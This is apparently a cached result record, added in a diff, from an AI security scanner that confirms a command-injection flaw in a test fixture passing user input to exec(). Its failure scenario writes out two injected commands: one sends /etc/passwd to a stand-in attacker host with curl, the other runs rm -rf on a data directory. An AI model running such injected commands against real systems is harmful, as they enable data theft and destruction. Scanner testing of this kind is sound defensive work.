@@ -1,0 +1,8 @@
+{
+  "key": "df7af2626b67832954f7b15525b226c4",
+  "file": "positive/rce/exec-non-literal-command.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"rce\",\n    \"lineNumbers\": [11],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"critical\",\n    \"summary\": \"Unsanitized user-controlled string is passed directly to exec(), allowing arbitrary shell command execution.\",\n    \"rationale\": \"The function parameter 'shellCommand' is passed directly to exec() on line 11 without any validation, sanitization, or escaping. Since exec() spawns a shell and executes the entire command string, an attacker who controls this parameter can inject arbitrary shell commands using shell metacharacters (semicolons, pipes, command substitution, etc.).\",\n    \"failureScenario\": \"An attacker calls runDiagnostic(\\\"ls; curl attacker.com/exfiltrate?data=$(cat /etc/passwd)\\\", callback) to exfiltrate sensitive data, or runDiagnostic(\\\"true; rm -rf /important/data\\\", callback) to execute destructive commands alongside legitimate-looking input.\",\n    \"confidence\": 1.0\n  }\n]\n```",
+  "recordedAt": "2026-08-12T04:16:32.948Z",
+  "elapsedMs": 19861.581153018178
+}
